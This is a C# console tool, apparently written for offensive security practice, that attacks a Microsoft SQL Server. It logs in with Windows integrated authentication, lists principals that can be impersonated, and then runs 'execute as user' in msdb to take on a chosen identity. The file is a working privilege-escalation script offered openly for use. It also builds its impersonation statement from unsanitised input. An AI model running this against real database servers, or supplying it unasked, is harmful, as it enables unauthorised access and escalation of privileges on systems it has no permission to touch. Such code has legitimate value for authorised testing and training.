using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Data.SqlClient;

namespace SqlImpersonateEnum
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.Write("[*] Enter target sql server: ");
            String sqlServer = Console.ReadLine();
            Console.Write("[*] Enter target database: ");
            String sqlDatabase = Console.ReadLine();
            String sqlConn = $"Server = {sqlServer}; Database = {sqlDatabase}; Integrated Security = True;";
            SqlConnection conn = new SqlConnection(sqlConn);

            try
            {
                conn.Open();
                Console.WriteLine("[+] Authentication success!");
            }
            catch
            {
                Console.WriteLine("[-] Authentication fail!");
                Environment.Exit(0);
            }

            String login = "select system_user;";
            SqlCommand cmd = new SqlCommand(login, conn);
            SqlDataReader read = cmd.ExecuteReader();
            read.Read();
            Console.WriteLine($"[+] Logged in user: {read[0]}");
            read.Close();

            String user = "select user_name();";
            cmd = new SqlCommand(user, conn);
            read = cmd.ExecuteReader();
            read.Read();
            Console.WriteLine($"[+] Mapped to user: {read[0]}");
            read.Close();

            String query = "select distinct b.name from sys.server_permissions a inner join sys.server_principals b on a.grantor_principal_id = b.principal_id where a.permission_name = 'impersonate';";
            cmd = new SqlCommand(query, conn);
            read = cmd.ExecuteReader();

            while (read.Read() == true)
            {
                Console.WriteLine($"[+] {read[0]} can be impersonated");
            }
            read.Close();

            Console.Write("[*] Would you like to attempt impersonation? [y/n]: ");
            String answer = Console.ReadLine();
            Console.Write("[*] Enter user to impersonate: ");
            String target = Console.ReadLine();

            if (answer.ToLower() == "y")
            {
                try
                {
                    Console.WriteLine($"[!] Attempting to impersonate {target}");
                    String runas = $"use msdb; execute as user = '{target}';";
                    cmd = new SqlCommand(runas, conn);
                    read = cmd.ExecuteReader();
                    read.Close();
                    Console.WriteLine("[+] Impersonation success!");
                }
                catch (Exception)
                {
                    Console.WriteLine("[-] Impersonation failed");
                    Environment.Exit(0);
                }

                String check = "select system_user;";
                cmd = new SqlCommand(check, conn);
                read = cmd.ExecuteReader();
                read.Read();
                Console.WriteLine($"[+] Current user: {read[0]}");
                read.Close();

                conn.Close();
            }
            else if (answer.ToLower() == "n")
            {
                conn.Close();
                Environment.Exit(0);
            }
            else
            {
                Console.WriteLine("[-] Invalid selection!");
                conn.Close();
                Environment.Exit(0);
            }
        }
    }
}